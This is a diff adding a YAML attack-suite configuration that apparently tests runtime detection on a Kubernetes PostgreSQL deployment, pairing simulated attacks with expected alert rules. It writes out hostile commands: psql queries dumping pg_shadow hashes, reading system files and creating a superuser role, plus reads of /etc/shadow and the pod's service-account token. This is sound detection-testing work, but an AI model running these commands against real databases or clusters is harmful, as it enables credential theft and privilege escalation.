@@ -1,0 +1,140 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: postgres-attacks
+  description: >-
+    Attack suite for CloudNativePG PostgreSQL. Attacks are executed from
+    the pg-client pod, connecting over the network to pg-rw:5432 —
+    simulating a compromised application with database credentials.
+
+    Attack categories:
+    1. SQL-based data exfiltration via psql (pg_shadow, pg_read_file, COPY)
+    2. Privilege escalation (CREATE ROLE SUPERUSER, ALTER ROLE)
+    3. File system access via PostgreSQL builtins (pg_read_file, lo_import)
+    4. OS-level post-exploitation from the client pod (token exfil, drifted binary)
+    5. Network reconnaissance from the client pod
+target:
+  service: pg-rw
+  namespace: postgres
+  port: 5432
+
+attacks:
+  # ═══════════════════════════════════════════════════════════════════════
+  # SQL-based attacks (from pg-client pod over the network)
+  # These abuse legitimate PostgreSQL functionality to exfiltrate data.
+  # ═══════════════════════════════════════════════════════════════════════
+
+  - name: sql-dump-pg-shadow
+    type: sqli
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "SELECT usename, passwd FROM pg_shadow;"]
+
+  - name: sql-read-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "SELECT pg_read_file('/etc/passwd');"]
+
+  - name: sql-read-pg-hba
+    type: cmdinject
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "SELECT pg_read_file('/var/lib/postgresql/data/pgdata/pg_hba.conf');"]
+
+  - name: sql-copy-exfil
+    type: sqli
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "COPY (SELECT * FROM bobtest) TO '/tmp/exfil.csv';"]
+
+  - name: sql-create-superuser
+    type: sqli
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "CREATE ROLE attacker WITH SUPERUSER LOGIN PASSWORD 'pwned';"]
+
+  - name: sql-large-object-import
+    type: cmdinject
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "SELECT lo_import('/etc/hostname');"]
+
+  - name: sql-dump-all-tables
+    type: sqli
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');"]
+
+  - name: sql-dump-settings
+    type: sqli
+    exec:
+      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
+                "SELECT name, setting FROM pg_settings WHERE name LIKE '%password%' OR name LIKE '%auth%';"]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # OS-level attacks from the client pod (post-exploitation)
+  # These simulate what an attacker does after gaining access to a pod
+  # with database credentials — probing the container, K8s API, etc.
+  # ═══════════════════════════════════════════════════════════════════════
+
+  - name: exec-whoami
+    type: cmdinject
+    exec:
+      command: ["whoami"]
+
+  - name: exec-sa-token
+    type: cmdinject
+    exec:
+      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
+
+  - name: exec-etc-shadow
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/shadow"]
+
+  - name: exec-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/passwd"]
+
+  - name: exec-drifted-binary
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_pg && /tmp/drifted_pg /etc; rm -f /tmp/drifted_pg"]
+
+  - name: exec-env-dump
+    type: cmdinject
+    exec:
+      command: ["env"]
+
+  - name: exec-pg-dump-schema
+    type: cmdinject
+    exec:
+      command: ["pg_dump", "-h", "pg-rw", "-d", "app", "--schema-only"]
+
+  - name: exec-network-recon
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /etc/resolv.conf && getent hosts kubernetes.default.svc || true"]
+
+expectedDetections:
+  - attackType: cmdinject
+    ruleID: R0001
+    ruleName: "Unexpected process launched"
+    command: whoami
+
+  - attackType: cmdinject
+    ruleID: R0001
+    ruleName: "Unexpected process launched"
+    command: cat
+
+  - attackType: cmdinject
+    ruleID: R0010
+    ruleName: "Unexpected Sensitive File Access"
+    command: cat
+
+  - attackType: cmdinject
+    ruleID: R1001
+    ruleName: "Drifted process executed"
+    command: drifted_pg
